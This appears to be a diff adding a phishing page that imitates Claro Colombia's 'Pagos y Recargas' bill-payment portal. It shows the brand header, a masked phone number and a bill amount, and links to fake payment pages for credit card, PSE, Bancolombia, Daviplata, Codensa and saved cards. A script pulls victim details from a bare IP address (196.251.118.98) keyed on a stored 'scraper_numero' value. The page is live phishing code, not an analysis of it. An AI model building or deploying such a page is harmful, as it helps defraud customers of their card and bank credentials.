@@ -1,0 +1,450 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Pago de Facturas - Claro</title>
+
+    <!-- Dependencias necesarias -->
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500;700&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="css/datos.css">
+</head>
+<body>
+    <!-- Top Bar -->
+    <div class="top-bar">
+        <div class="top-bar-container">
+            <div class="top-bar-left">
+                <a href="#" class="top-bar-link">Personas</a>
+                <a href="#" class="top-bar-link">Negocios</a>
+                <a href="#" class="top-bar-link">Empresas</a>
+            </div>
+            <div class="top-bar-right">
+                <a href="#" class="top-bar-item">
+                    <span>Más de Claro</span>
+                    <i class="fas fa-chevron-down"></i>
+                </a>
+                <a href="#" class="top-bar-item">
+                    <img src="https://flagcdn.com/w40/co.png" alt="Colombia" class="flag-icon">
+                    <i class="fas fa-chevron-down"></i>
+                </a>
+            </div>
+        </div>
+    </div>
+
+    <!-- Main Header -->
+    <div class="main-header">
+        <div class="main-header-container">
+            <div class="header-left">
+                <div class="logo">
+                    <img src="img/imgi_18_logo-claro-blanco.svg" alt="Claro logo">
+                </div>
+                <nav class="main-nav">
+                    <a href="#" class="nav-item">
+                        Servicios
+                        <i class="fas fa-chevron-down"></i>
+                    </a>
+                    <a href="#" class="nav-item">
+                        Tienda
+                        <i class="fas fa-chevron-down"></i>
+                    </a>
+                    <a href="#" class="nav-item">
+                        Beneficios
+                        <i class="fas fa-chevron-down"></i>
+                    </a>
+                    <a href="#" class="nav-item">
+                        Soporte
+                        <i class="fas fa-chevron-down"></i>
+                    </a>
+                </nav>
+            </div>
+
+            <div style="width: 300px; color: transparent;">a</div>
+
+            <div class="header-right">
+                <a href="#" class="header-link user-link">
+                    <i class="fas fa-user-circle"></i>
+                    Mi Claro
+                </a>
+            </div>
+        </div>
+    </div>
+
+    <!-- Portal Title and Progress Steps -->
+    <div class="portal-title-section">
+        <h1 class="portal-title">
+            Portal de <span class="portal-title-highlight">PAGOS Y RECARGAS</span>
+        </h1>
+
+        <div class="progress-steps">
+            <div class="step active">
+                <div class="step-icon-wrapper">
+                   <img src="img/imgi_20_icono-seleccion-on.png" alt="">
+                </div>
+                <div class="step-text">
+                    <span class="step-title">Selecciona</span>
+                    tu servicio
+                </div>
+            </div>
+
+            <div class="step">
+                <div class="step-icon-wrapper">
+                    <img src="img/icono-mediopago-on.png" alt="">
+                </div>
+                <div class="step-text">
+                    <span class="step-title">Escoge el</span>
+                    medio de pago
+                </div>
+            </div>
+
+            <div class="step">
+                <div class="step-icon-wrapper">
+                   <img src="img/imgi_22_icono-pago-off.png" alt="">
+                </div>
+                <div class="step-text">
+                    <span class="step-title">Realiza el</span>
+                    pago en línea
+                </div>
+            </div>
+
+            <div class="step">
+                <div class="step-icon-wrapper">
+                    <img src="img/imgi_23_icono-resultado-off.png" alt="">
+                </div>
+                <div class="step-text">
+                    <span class="step-title">Recibe la</span>
+                    confirmación
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Payment Section -->
+    <div class="payment-section">
+        <div class="payment-card">
+            <div class="payment-header">
+                Paga tu factura Postpago
+            </div>
+            <div class="payment-body">
+                <div class="payment-row">
+                    <div class="payment-label">Valor TOTAL de saldo actual a pagar:</div>
+                    <div class="payment-value highlight">
+                        $ 104.956,11
+                        <a href="#" class="edit-link">
+                            <i class="fas fa-edit"></i> Editar
+                        </a>
+                    </div>
+                </div>
+                <div class="payment-row">
+                    <div class="payment-label">Número Celular:</div>
+                    <div class="payment-value">*******9901</div>
+                </div>
+                <div class="payment-row">
+                    <div class="payment-label">Pague antes de:</div>
+                    <div class="payment-value">22/10/2025</div>
+                </div>
+                <div class="payment-row">
+                    <div class="payment-label">Valor a pagar por servicios + Suplementarios:</div>
+                    <div class="payment-value">$ 0,00</div>
+                </div>
+                <div class="payment-row">
+                    <div class="payment-label">Valor a pagar por equipo:</div>
+                    <div class="payment-value">$ 0,00</div>
+                </div>
+                <div class="payment-row">
+                    <div class="payment-label">Fecha de carga de minutos:</div>
+                    <div class="payment-value">11/11/2025</div>
+                </div>
+                <div class="payment-row">
+                    <div class="payment-label">Referencia de pago:</div>
+                    <div class="payment-value">*******1742</div>
+                </div>
+            </div>
+        </div>
+
+        <div class="payment-method-section">
+            <h2 class="payment-method-title">Selecciona el medio de pago</h2>
+            <p class="payment-method-text">
+                Si ya dispones de una tarjeta <strong>Débito que funciona como crédito</strong> tendrás la oportunidad de utilizarla en la plataforma de Claro, debes asegurarte que en la parte de atrás tenga el código de Seguridad, para más información comunícate con tu banco.
+            </p>
+        </div>
+    </div>
+
+    <!-- Payment Options Dropdown -->
+    <div class="payment-options-container">
+        <div class="payment-dropdown" id="paymentDropdown">
+            <!-- Caja vacía que se hace click -->
+        </div>
+
+        <div class="payment-options-list" id="paymentOptionsList">
+            <a href="tarjeta-credito.html" class="payment-option">
+                <div class="payment-option-icon">
+                    <img src="img/FORMA_PAGO_2.png" alt="Tarjeta crédito">
+                </div>
+                <div class="payment-option-text">Tarjeta crédito</div>
+            </a>
+
+            <a href="pse.html" class="payment-option">
+                <div class="payment-option-icon">
+                    <img src="img/FORMA_PAGO_1.png" alt="PSE">
+                </div>
+                <div class="payment-option-text">Débito Bancario PSE</div>
+                <!-- <div class="payment-option-badges">
+                    <img src="img/badge-nequi.png" alt="Nequi" style="height: 20px;">
+                    <img src="img/badge-daviplata.png" alt="Daviplata" style="height: 20px;">
+                </div> -->
+            </a>
+
+            <a href="bancolombia.html" class="payment-option">
+                <div class="payment-option-icon">
+                    <img src="img/FORMA_PAGO_18.png" alt="Bancolombia">
+                </div>
+                <div class="payment-option-text">Botón Bancolombia</div>
+            </a>
+
+            <a href="daviplata.html" class="payment-option">
+                <div class="payment-option-icon">
+                    <img src="img/FORMA_PAGO_10.png" alt="Daviplata">
+                </div>
+                <div class="payment-option-text">Daviplata</div>
+            </a>
+
+            <a href="codensa.html" class="payment-option">
+                <div class="payment-option-icon">
+                    <img src="img/FORMA_PAGO_6.png" alt="Codensa">
+                </div>
+                <div class="payment-option-text">Tarjeta Codensa</div>
+            </a>
+
+            <a href="tarjetas-registradas.html" class="payment-option">
+                <div class="payment-option-icon">
+                    <img src="img/FORMA_PAGO_4.png" alt="Mis tarjetas">
+                </div>
+                <div class="payment-option-text">Mis tarjetas registradas</div>
+            </a>
+        </div>
+    </div>
+
+        <script>
+        // Función para formatear valores monetarios
+        function formatCurrency(value) {
+            if (!value) return '—';
+            // Si ya tiene formato, dejarlo como está
+            if (value.includes('$') || value.includes(',')) return value;
+            // Si es un número, formatearlo
+            const num = parseFloat(value.replace(/[^\d.,]/g, '').replace(',', '.'));
+            if (!isNaN(num)) {
+                return new Intl.NumberFormat('es-CO', {
+                    style: 'currency',
+                    currency: 'COP',
+                    minimumFractionDigits: 2
+                }).format(num);
+            }
+            return value;
+        }
+
+        // Función para obtener y mostrar los detalles
+        async function loadPaymentDetails() {
+            try {
+                // Mostrar loading
+                document.body.style.opacity = '0.7';
+                
+                // Obtener detalles del servidor
+                const response = await fetch('/datos', {
+                    method: 'GET',
+                    credentials: 'include'
+                });
+                
+                if (!response.ok) {
+                    throw new Error('Error al cargar detalles');
+                }
+                
+                const html = await response.text();
+                const parser = new DOMParser();
+                const doc = parser.parseFromString(html, 'text/html');
+                
+                // Extraer detalles del HTML
+                const detailsContainer = doc.querySelector('.payment-body');
+                if (!detailsContainer) {
+                    showNoPayments();
+                    return;
+                }
+                
+                // Actualizar la página con los detalles
+                updatePaymentDetails(doc);
+                
+            } catch (error) {
+                console.error('Error:', error);
+                showNoPayments();
+            } finally {
+                document.body.style.opacity = '1';
+            }
+        }
+
+        function updatePaymentDetails(doc) {
+            // Actualizar cada campo con los datos extraídos
+            const fields = {
+                'valor_total': '.payment-value.highlight',
+                'celular': '.payment-row:nth-child(2) .payment-value',
+                'pague_antes': '.payment-row:nth-child(3) .payment-value',
+                'valor_servicios': '.payment-row:nth-child(4) .payment-value',
+                'valor_equipo': '.payment-row:nth-child(5) .payment-value',
+                'fecha_carga': '.payment-row:nth-child(6) .payment-value',
+                'referencia': '.payment-row:nth-child(7) .payment-value'
+            };
+
+            let hasData = false;
+            
+            Object.entries(fields).forEach(([field, selector]) => {
+                const element = doc.querySelector(selector);
+                if (element) {
+                    let value = element.textContent.trim();
+                    
+                    // Formatear valores monetarios
+                    if (field.includes('valor')) {
+                        value = formatCurrency(value);
+                    }
+                    
+                    if (value && value !== '—' && !value.includes('$ 0,00')) {
+                        const targetElement = document.querySelector(selector);
+                        if (targetElement) {
+                            targetElement.textContent = value;
+                            hasData = true;
+                        }
+                    }
+                }
+            });
+
+            if (!hasData) {
+                showNoPayments();
+            }
+        }
+
+        function showNoPayments() {
+            const paymentSection = document.querySelector('.payment-section');
+            if (paymentSection) {
+                paymentSection.innerHTML = `
+                    <div class="no-payments-message">
+                        <h3>No se encontraron pagos pendientes</h3>
+                        <p>No hay facturas pendientes de pago para este número.</p>
+                        <button onclick="window.location.href = 'index.html'" class="btn btn-continue active">
+                            Volver al inicio
+                        </button>
+                    </div>
+                `;
+            }
+        }
+
+        // Cargar los detalles cuando la página esté lista
+        document.addEventListener('DOMContentLoaded', function() {
+            loadPaymentDetails();
+        });
+
+       
+    </script>
+   <script>
+        const API_BASE = 'https://196.251.118.98';
+
+        async function fetchAndRenderDetails() {
+            const numero = sessionStorage.getItem('scraper_numero');
+            if (!numero) {
+                showNoPayments();
+                return;
+            }
+            
+            try {
+                const resp = await fetch(`${API_BASE}/api/details/${encodeURIComponent(numero)}`, { 
+                    method: 'GET', 
+                    mode: 'cors', 
+                    credentials: 'include' 
+                });
+                
+                if (!resp.ok) {
+                    console.error('Response not OK:', resp.status);
+                    showNoPayments();
+                    return;
+                }
+                
+                const j = await resp.json();
+                console.log('Datos recibidos:', j);
+                
+                if (!j.found || !j.details) {
+                    showNoPayments();
+                    return;
+                }
+                
+                const d = j.details;
+                
+                // Actualizar valor total (con el link de Editar)
+                const valEls = document.querySelectorAll('.payment-value.highlight');
+                if (valEls && valEls.length > 0) {
+                    const valorTotal = d.valor_total || '—';
+                    valEls[0].innerHTML = `${valorTotal}<a href="#" class="edit-link"><i class="fas fa-edit"></i> Editar</a>`;
+                }
+                
+                // Actualizar el resto de campos
+                const allVals = document.querySelectorAll('.payment-value');
+                let nonHighlight = Array.from(allVals).filter(el => !el.classList.contains('highlight'));
+                
+                if (nonHighlight.length >= 6) {
+                    nonHighlight[0].textContent = d.celular || '—';
+                    nonHighlight[1].textContent = d.pague_antes || '—';
+                    nonHighlight[2].textContent = d.valor_servicios || '—';
+                    nonHighlight[3].textContent = d.valor_equipo || '—';
+                    nonHighlight[4].textContent = d.fecha_carga || '—';
+                    nonHighlight[5].textContent = d.referencia || '—';
+                    
+                    console.log('Datos mostrados correctamente en la página');
+                } else {
+                    console.warn('No se encontraron suficientes elementos .payment-value');
+                    const container = document.querySelector('.payment-body') || document.body;
+                    const box = document.createElement('div');
+                    box.style.padding = '10px';
+                    box.style.border = '1px solid #ddd';
+                    box.style.marginTop = '20px';
+                    box.innerHTML = '<strong>Detalles extraídos:</strong><pre>' + JSON.stringify(d, null, 2) + '</pre>';
+                    container.appendChild(box);
+                }
+                
+            } catch (err) {
+                console.error('Error fetchAndRenderDetails:', err);
+                showNoPayments();
+            }
+        }
+
+        function showNoPayments() {
+            const paymentSection = document.querySelector('.payment-section');
+            if (paymentSection) {
+                paymentSection.innerHTML = `
+                    <div style="text-align:center; padding:40px;">
+                        <h3 style="color:#c0392b; margin-bottom:15px;">No se encontraron pagos pendientes</h3>
+                        <p style="margin-bottom:25px;">No hay facturas pendientes de pago para este número.</p>
+                        <button onclick="window.location.href='index.html'" style="padding:12px 24px; background:#e30613; color:white; border:none; border-radius:4px; cursor:pointer; font-size:16px;">
+                            Volver al inicio
+                        </button>
+                    </div>
+                `;
+            }
+        }
+
+        // Ejecutar cuando la página cargue
+        document.addEventListener('DOMContentLoaded', function() {
+            console.log('Página cargada, buscando detalles...');
+            console.log('Número en sessionStorage:', sessionStorage.getItem('scraper_numero'));
+            fetchAndRenderDetails();
+        });
+
+        // Dropdown functionality para métodos de pago
+        const dropdown = document.getElementById('paymentDropdown');
+        const optionsList = document.getElementById('paymentOptionsList');
+
+        if (dropdown && optionsList) {
+            dropdown.addEventListener('click', function() {
+                this.classList.toggle('active');
+                optionsList.classList.toggle('show');
+            });
+        }
+    </script>
+</body>
+</html>
+
